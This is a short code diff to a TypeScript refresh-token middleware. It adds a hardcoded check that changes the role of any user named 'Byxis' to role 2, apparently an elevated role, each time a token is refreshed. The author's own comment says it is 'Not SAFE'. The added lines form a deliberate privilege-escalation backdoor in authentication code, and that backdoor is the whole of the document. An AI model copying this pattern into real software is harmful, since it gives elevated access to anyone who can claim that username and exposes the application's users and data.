@@ -48,6 +48,11 @@ export async function refreshTokenMiddleware(ctx: Context) {
     return;
   }
 
+  // Not SAFE but it's ok for now
+  if (payload.username === "Byxis") {
+    sqlHandler.changeUserRole(userId, 2);
+  }
+
   sqlHandler.removeRefreshToken(token);
 
   const userRole = await sqlHandler.getUserRole(userId);
